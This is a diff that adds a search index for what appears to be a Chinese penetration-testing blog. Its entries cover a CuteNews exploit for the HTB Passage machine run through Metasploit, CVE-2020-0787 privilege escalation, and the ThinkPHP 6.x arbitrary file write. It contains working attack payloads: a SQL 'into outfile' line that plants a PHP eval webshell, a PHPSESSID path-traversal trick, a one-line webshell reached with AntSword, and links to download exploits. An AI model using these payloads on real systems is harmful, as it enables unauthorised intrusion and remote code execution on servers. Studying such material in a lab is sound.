@@ -1,0 +1,77 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>HTB Passage教程</title>
+    <link href="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/"/>
+    <url>/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/</url>
+    
+    <content type="html"><![CDATA[<p>打开界面如图：<br><img src="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/01.png"></p><p>看了下最底部有CMS ：CuteNews<br>注册个用户：<br><img src="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/02.png"></p><p>最下方有版本号：2.1.2,直接百度CuteNews 2.1.2复现，查到有相关漏洞，直接下载poc（poc在最下方），放到MSF中，MSF加载脚本（不会的自己百度）：<br><img src="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/03.png"></p><p>设置相应参数，成功得到meterpreter会话：<br><img src="/2021/03/05/HTB-Passage%E6%95%99%E7%A8%8B/04.png"></p><p>poc:<br><a href="/download/46698.rb">点击下载</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2021/03/05/HTB-Can-you-encrypt-fast-enough/"/>
+    <url>/2021/03/05/HTB-Can-you-encrypt-fast-enough/</url>
+    
+    <content type="html"><![CDATA[<p>select ‘<?php eval($_POST[123]) ?>‘ into outfile ‘D:/phpstudy_pro/WWW/123.php’;</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>CVE-2020-0787提权</title>
+    <link href="/2020/11/21/CVE-2020-0787%E6%8F%90%E6%9D%83/"/>
+    <url>/2020/11/21/CVE-2020-0787%E6%8F%90%E6%9D%83/</url>
+    
+    <content type="html"><![CDATA[<p>1.低权限用户登录后执行poc<br><img src="/2020/11/21/CVE-2020-0787%E6%8F%90%E6%9D%83/01.png"></p><p>2.返回管理员权限cmd<br><img src="/2020/11/21/CVE-2020-0787%E6%8F%90%E6%9D%83/02.png"></p><p>poc：<br><a href="/download/poc.exe">点击下载</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>主机</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>thinkphp6.x任意文件写入漏洞</title>
+    <link href="/2020/11/20/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2020/11/20/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<ol><li><p>在cookies中构造长度为32位的PHPSESSID:如/../../../public/0000000000x.php</p><img src="/2020/11/20/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/1605886532449.png"></li><li><p>访问index/vuln?param=<?php phpinfo();?><br> param后的参数即为你要输入的payload</p></li><li><p>访问后会在 web 根目录生成 0000000000x.php （如果有写入权限的话）</p></li><li><p>写入一句话：将param后的参数替换为一句话 <?php @eval($_POST[pp]);?></p></li><li><p>蚁剑连接：</p><img src="/2020/11/20/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/1605886884765.png"></li><li><p>成功getshell：</p><img src="/2020/11/20/thinkphp6-x%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/1605887022637.png"></li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  
+</search>
